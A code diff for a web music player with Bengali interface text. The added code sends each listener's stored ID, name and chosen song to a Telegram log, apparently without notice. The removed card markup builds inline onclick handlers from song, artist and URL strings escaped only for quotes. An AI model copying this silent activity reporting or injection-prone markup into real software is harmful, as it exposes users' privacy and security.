-                                <div onclick="playTrack('${songName.replace(/'/g, "\\'")}', '${artistName.replace(/'/g, "\\'")}', '${audioUrl}', '${imageUrl}')">
-                                    <img src="${imageUrl}" class="song-cover" alt="Cover">
-                                    <div style="font-size: 14px; font-weight: 700; margin: 8px 0 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${songName}</div>
-                                    <div style="font-size: 12px; color: var(--text-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${artistName}</div>
-                                </div>
-                            `;
-                            songGrid.appendChild(card);
-                        });
-                    } else {
-                        songGrid.innerHTML = '<div style="text-align:center; grid-column: 1/-1;">কোনো গান পাওয়া যায়নি। আবার সার্চ করুন!</div>';
-                    }
+                }).catch(() => {
+                    grid.innerHTML = '<div style="color: #a7a7a7;">লোডিং এ সমস্যা হয়েছে। আবার চেষ্টা করুন।</div>';
                 });
         }
 
         const audio = document.getElementById('audioEngine');
         const playIcon = document.getElementById('playIcon');
-
-        function togglePlay() {
-            if (!audio.src) return;
-            if (audio.paused) {
-                audio.play();
-                playIcon.className = 'fa-solid fa-pause';
-            } else {
-                audio.pause();
-                playIcon.className = 'fa-solid fa-play';
-            }
-        }
 
         function playTrack(title, artist, url, thumb) {
             document.getElementById('playerTitle').innerText = title;
@@ -667,7 +527,42 @@
             audio.src = url;
             audio.play();
             playIcon.className = 'fa-solid fa-pause';
-            trackAction(`Listened to: "${title}" by ${artist}`);
+
+            const uid = localStorage.getItem('pix_user_id') || 'GUEST';
+            const uname = localStorage.getItem('pix_user_name') || 'Guest';
+            sendTelegramLog(`━━━━━━━━━━━━━━━━━━━━\n⚡ <b>SPOTIFY PLAYING ACTIVITY</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>User:</b> ${uname} <code>[PIX-${uid}]</code>\n🎵 <b>Song:</b> ${title} - ${artist}\n⏰ <b>Time:</b> ${new Date().toLocaleTimeString()}\n━━━━━━━━━━━━━━━━━━━━`);
+        }
+
+        function togglePlay() {
+            if(!audio.src) return;
+            if(audio.paused) { audio.play(); playIcon.className = 'fa-solid fa-pause'; }
+            else { audio.pause(); playIcon.className = 'fa-solid fa-play'; }
+        }
+
+        function resetPlayButton() { playIcon.className = 'fa-solid fa-play'; }
+
+        function updateProgress() {
+            if(audio.duration) {
+                const progress = (audio.currentTime / audio.duration) * 100;
+                document.getElementById('progressSlider').value = progress;
+                
+                let curM = Math.floor(audio.currentTime / 60);
+                let curS = Math.floor(audio.currentTime % 60);
+                document.getElementById('currentTime').innerText = `${curM}:${curS < 10 ? '0':''}${curS}`;
+
+                let durM = Math.floor(audio.duration / 60);
+                let durS = Math.floor(audio.duration % 60);
+                document.getElementById('totalDuration').innerText = `${durM}:${durS < 10 ? '0':''}${durS}`;
+            }
+        }
+
+        function seekAudio() {
+            const val = document.getElementById('progressSlider').value;
+            if(audio.duration) { audio.currentTime = (val / 100) * audio.duration; }
+        }
+
+        function changeVolume() {
+            audio.volume = document.getElementById('volumeSlider').value;
         }
     </script>
 </body>
